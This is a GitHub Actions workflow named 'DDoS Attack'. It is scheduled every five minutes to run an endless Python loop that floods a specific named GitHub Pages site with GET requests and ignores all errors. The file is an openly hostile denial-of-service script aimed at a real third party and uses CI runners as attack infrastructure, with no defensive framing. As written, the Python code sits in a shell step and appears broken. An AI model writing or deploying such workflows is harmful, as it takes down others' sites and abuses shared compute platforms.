name: DDoS Attack

on:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.x'
      
      - name: Install dependencies
        run: pip install requests
      
      - name: Run Attack
        run: |
          import requests
          while True:
              try:
                  requests.get('https://srabakio.github.io/')
              except:
                  pass
